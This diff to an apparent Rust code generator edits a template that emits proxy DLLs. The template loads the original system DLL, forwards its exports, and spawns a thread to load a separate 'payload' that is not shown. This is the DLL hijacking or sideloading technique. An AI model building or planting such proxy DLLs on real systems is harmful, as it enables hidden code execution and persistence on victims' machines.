@@ -122,6 +122,7 @@ windows = {{ version = "0.58", features = [
     "Win32_Foundation",
     "Win32_System_LibraryLoader",
     "Win32_System_Threading",
+    "Win32_Security",
 ] }}
 
 [profile.release]
@@ -159,12 +160,17 @@ panic = "abort"
 
 use std::sync::OnceLock;
 use windows::core::{PCSTR, s};
-use windows::Win32::Foundation::{BOOL, HINSTANCE};
+use windows::Win32::Foundation::{BOOL, HINSTANCE, HMODULE};
 use windows::Win32::System::LibraryLoader::{GetProcAddress, LoadLibraryW};
 use windows::Win32::System::Threading::CreateThread;
 
+// Thread-safe wrapper for HMODULE
+struct SyncHMODULE(HMODULE);
+unsafe impl Sync for SyncHMODULE {}
+unsafe impl Send for SyncHMODULE {}
+
 /// Handle to the original system DLL
-static ORIGINAL_DLL: OnceLock<HINSTANCE> = OnceLock::new();
+static ORIGINAL_DLL: OnceLock<SyncHMODULE> = OnceLock::new();
 
 /// DLL entry point
 #[no_mangle]
@@ -183,7 +189,7 @@ extern "system" fn DllMain(hinst_dll: HINSTANCE, fdw_reason: u32, _lpv_reserved:
 
         unsafe {{
             if let Ok(dll) = LoadLibraryW(windows::core::PCWSTR::from_raw(wide_path.as_ptr())) {{
-                ORIGINAL_DLL.set(dll).ok();
+                ORIGINAL_DLL.set(SyncHMODULE(dll)).ok();
 
                 // Spawn thread to load payload
                 CreateThread(
@@ -229,13 +235,18 @@ unsafe extern "system" fn payload_thread(_: *mut std::ffi::c_void) -> u32 {{
                 continue;
             }
 
+            // Skip DllMain - we already define this as the entry point
+            if export.name == "DllMain" {
+                continue;
+            }
+
             code.push_str(&format!(
                 r#"/// Forward to {name}
 #[no_mangle]
 #[allow(non_snake_case)]
 pub unsafe extern "system" fn {name}() {{
     if let Some(dll) = ORIGINAL_DLL.get() {{
-        if let Some(proc) = GetProcAddress(*dll, s!("{name}")) {{
+        if let Some(proc) = GetProcAddress(dll.0, s!("{name}")) {{
             let func: extern "system" fn() = std::mem::transmute(proc);
             func();
         }}
